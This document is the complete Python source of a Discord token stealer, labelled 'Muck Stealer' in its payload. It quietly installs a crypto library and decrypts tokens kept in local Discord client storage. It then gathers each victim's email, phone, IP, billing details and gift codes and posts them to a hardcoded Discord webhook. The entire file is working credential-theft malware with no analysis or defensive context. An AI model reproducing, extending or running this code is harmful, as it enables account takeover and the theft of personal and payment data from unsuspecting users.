
import os
import re
import time
from requests import post
import warnings
import threading
import subprocess
import uuid
from sys import executable, stderr
import requests
from base64 import b64decode
from json import loads, dumps
from urllib.request import Request, urlopen
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

class NullWriter(object):
    def write(self, arg):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
stderr = null_writer

ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
        time.sleep(3)

from Crypto.Cipher import AES
hook = "h**ps://discord.com/api/webhooks/1216851073994850384/uvH3W6mIXZ8Ima-s5SVoXmysDWAqteNXPkAuaSs2oIuL1FE-yUzsBnjeWmE9l-PmvvBT"

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def getip():
    try:return urlopen(Request("h**ps://api.ipify.org")).read().decode().strip()
    except:return "None"
def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16]
            try: decrypted_pass = decrypted_pass.decode()
            except:pass
            return decrypted_pass

def LoadUrlib(hook, data='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
            else:
                r = urlopen(Request(hook, data=data))
            return r
        except: 
           pass

def Trust(Cookies):
    # simple Trust Factor system - OFF for the moment
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    DETECTED = True if len(tim) < -1 else False
    return DETECTED

def getCodes(token):
    try:
        headers = {
            "Authorization": token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }

        def fetch_codes(url):
            response = urlopen(Request(url, headers=headers))
            data = loads(response.read().decode())
            return data

        codess = fetch_codes("h**ps://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB")
        nitrocodess = fetch_codes("h**ps://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB")

        codes = ""
        for code in codess:
            try:
                codes += f":tickets: **{code['promotion']['outbound_title']}**\n<:Rightdown:891355646476296272> `{code['code']}`\n"
            except:
                pass

        for element in nitrocodess:
            sku_id = element['sku_id']
            subscription_plan_id = element['subscription_plan']['id']
            name = element['subscription_plan']['name']
            url = f"h**ps://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
            nitrrrro = fetch_codes(url)
            for el in nitrrrro:
                cod = el['code']
                try:
                    codes += f":tickets: **{name}**\n<:Rightdown:891355646476296272> `h**ps://discord.gift/{cod}`\n"
                except:
                    pass
        return codes
    except:
        return ""

# credit to NinjaRideV6 for this function
def getbillq(token):
    headers = {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    billq = "`(LQ Billing)`"
    try:
        bill = loads(urlopen(Request("h**ps://discord.com/api/v9/users/@me/billing/payments?limit=20",headers=headers)).read().decode())
        if bill == []: bill = ""
        elif bill[0]['status'] == 1: billq = "`(HQ Billing)`"
    except: pass
    return billq

url = "h**ps://discord.com"

response = requests.get(url)

unique_id = uuid.uuid4()

def GetBilling(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        billingjson = loads(urlopen(Request("h**ps://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
    except:
        return False

    if billingjson == []: return " -"

    billing = ""
    for methode in billingjson:
        if methode["invalid"] == False:
            if methode["type"] == 1:
                billing += ":credit_card:"
            elif methode["type"] == 2:
                billing += ":parking: "

    return billing

def GetTokenInfo(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    userjson = loads(urlopen(Request("h**ps://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
    username = userjson["username"]
    hashtag = userjson["discriminator"]
    email = userjson["email"]
    idd = userjson["id"]
    pfp = userjson["avatar"]
    flags = userjson["public_flags"]
    nitro = ""
    phone = "-"

    if "premium_type" in userjson:
        nitrot = userjson["premium_type"]
        if nitrot == 1:
            nitro = "<:classic:896119171019067423> "
        elif nitrot == 2:
            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
    if "phone" in userjson: phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "-"

    return username, hashtag, email, idd, pfp, flags, nitro, phone

def checkToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("h**ps://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False
def Trim(obj):
    if len(obj) > 1000:
        f = obj.split("\n")
        obj = ""
        for i in f:
            if len(obj) + len(i) >= 1000:
                obj += "..."
                break
            obj += i + "\n"
    return obj

# Function to upload token information
def uploadToken(token, path):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    # Function for obtaining user info from the token - you need to implement this part
    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
    pfp = f"h**ps://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp else "h**ps://i.imgur.com/Npe8QuD.png"
    billing = GetBilling(token)
    codes = Trim(getCodes(token))

    # Simplified conditional assignment for codes, billing, and phone
    codes = codes or "`No Codes`"
    billing = billing or ":lock:"
    phone = phone or "-"

    data = {
        "content": 'Muck Stealer',
        "embeds": [
            {
                "2895667": 14406413,
                "fields": [
                    {"name": "Token:", "value": f"`{token}`"},
                    {"name": "Gmail:" if "@gmail.com" in email else "Mail:", "value": f"`{email}`", "inline": False},
                    {"name": "Phone:", "value": f"`{phone}`", "inline": False},
                    {"name": "IP:", "value": f"`{IP}`", "inline": False},
                    {"name": "Gift codes:", "value": codes, "inline": False}
                ]
            }
        ],
        "attachments": []
    }
    
    # Use post from the requests library instead of LoadUrlib
    requests.post(hook, json=data, headers=headers)

# Function to get tokens from files
def getToken(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith((".log", ".ldb")):
            for line in [x.strip() for x in open(f"{path}/{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if token not in Tokens:
                                Tokens += token
                                uploadToken(token, path)

# Function to get Discord data from user directories
def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"):
        return

    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = loads(f.read())
    
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith((".log", ".ldb")):
            for line in [x.strip() for x in open(f"{pathC}/{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if tokenDecoded not in Tokens:
                            Tokens += tokenDecoded
                            uploadToken(tokenDecoded, path)

# Function to start a new thread
def Startthread(meth, args=[]):
    a = threading.Thread(target=meth, args=args)
    a.start()
    Threadlist.append(a)

# Function to gather Discord data from various locations
def GatherAll():
    discordPaths = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]
    for patt in discordPaths:
        Startthread(GetDiscord, [patt[0], patt[1]])

# Initialize variables
global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip, Threadlist
DETECTED = False
IP = getip()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
ttusrnames = []
Threadlist, Tokens = [], ''

# Start gathering Discord data
GatherAll()